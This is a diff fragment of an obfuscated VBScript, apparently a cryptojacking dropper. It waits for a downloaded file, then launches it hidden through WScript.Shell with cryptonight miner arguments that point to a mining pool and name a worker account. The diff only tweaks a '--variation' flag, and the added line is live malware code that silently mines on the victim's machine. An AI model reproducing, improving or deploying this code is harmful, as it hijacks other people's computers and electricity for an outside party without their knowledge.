@@ -22,7 +22,7 @@ loop Until FDrtt.FileExists(UMbty)
 Set FDrtu = WScript.CreateObject("WScript.Shell")
 trv="FDrtu.Run UMbty"
 trv=trv&" & "
-trv=trv&""" --auto --any --forever --variation 3 --low -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x"", 0, false"
+trv=trv&""" --auto --any --forever --variation 3 --variation 15 --low -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x"", 0, false"
 Execute trv
 WScript.Quit
 Function FDrty(InetFile, jvc)
